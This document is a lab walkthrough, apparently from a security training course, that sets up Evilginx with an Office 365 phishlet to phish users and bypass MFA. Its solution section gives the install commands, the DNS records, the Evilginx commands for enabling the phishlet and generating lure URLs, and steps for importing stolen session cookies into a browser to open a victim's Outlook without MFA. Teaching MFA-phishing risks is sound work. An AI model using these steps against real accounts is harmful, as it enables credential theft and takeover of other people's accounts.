# LAB 3.4 - Evilginx for MFA - DEMO

### Lab Overview

This lab will guide you through setting up Evilginx on a Kali Linux machine and using the Office 365 phishlet to attempt a man-in-the-middle (MITM) attack that can potentially bypass Multi-Factor Authentication (MFA). This exercise demonstrates the importance of secure MFA implementation and the risks associated with phishing attacks targeting MFA-protected accounts.

---

### Lab Section

### **1. Prerequisites**

- A Kali Linux system with administrative privileges.
- Domain name and DNS management access (e.g., using Cloudflare).
- A registered domain name for phishing and subdomains setup.
- Basic knowledge of DNS and command line operations.

### **2. Environment Setup**

1. **Install Evilginx on Kali Linux:**
    - Set up and install Evilginx from the official repository.
    - Configure and start the Evilginx server.
2. **Configure Domain and DNS:**
    - Set up DNS records for your phishing domain to point to your Evilginx server.
3. **Set up Office 365 Phishlet:**
    - Enable and configure the Office 365 phishlet in Evilginx.
    - Test the phishlet setup to ensure it is functioning correctly.

### **3. Capturing and Using Tokens**

1. **Send Phishing Link:**
    - Create and distribute a phishing link to the target user.
2. **Capturing Credentials and Tokens:**
    - Capture credentials and session tokens from the target user.
3. **Bypass MFA and Access Account:**
    - Use the captured tokens to access the target’s Office 365 account, bypassing MFA.

### 

## Solution:

### Step 1: Environment Setup

https://www.youtube.com/watch?v=r4Y53s6P51k

### 1. Install Evilginx on Kali Linux

- **Install Go Language:**
    
    ```bash
    sudo apt update
    sudo apt install golang -y
    
    ```
    
- **Download and Install Evilginx:**
    
    ```bash
    git clone https://github.com/kgretzky/evilginx2.git
    cd evilginx2
    go build
    ./evilginx2
    
    ```
    
- **Configure and Start Evilginx:**
    
    ```bash
    ./evilginx
    
    ```
    
    - Evilginx will create the necessary directories and configurations.

### 2. Configure Domain and DNS

- **Set Up DNS Records:**
    - Go to your domain registrar or DNS management service (e.g., Cloudflare).
    - Create an `A` record pointing to your Evilginx server's IP.
    - For example:
        - `phish.yourdomain.com -> your_server_IP`

### 3. Set Up Office 365 Phishlet

- **Load Phishlet in Evilginx:**
    
    ```bash
    config domain phish.yourdomain.com
    config ip your_server_IP
    phishlets hostname o365 phish.yourdomain.com
    phishlets enable o365
    
    ```
    
- **Verify Phishlet Status:**
    
    ```bash
    
    phishlets
    
    ```
    
    - Ensure the Office 365 phishlet shows as `enabled` and `active`.

### Step 2: Capturing and Using Tokens

### 1. Send Phishing Link

- **Create Phishing Link:**
    
    ```bash
    lures create o365
    lures get-url 1
    
    ```
    
    - This command will generate a phishing URL. Send this link to the target.

### 2. Capturing Credentials and Tokens

- **Monitor Evilginx Logs:**
    - Watch the Evilginx terminal for incoming connections.
    - Captured credentials and tokens will be displayed in real time.

### 3. Bypass MFA and Access Account

- **Using Captured Tokens:**
    - Copy the session tokens from Evilginx.
    - Use a browser extension like EditThisCookie to import the session cookies into your browser.
- **Access Target Account:**
    - Navigate to `https://outlook.office.com` and observe the session being authenticated without triggering MFA.
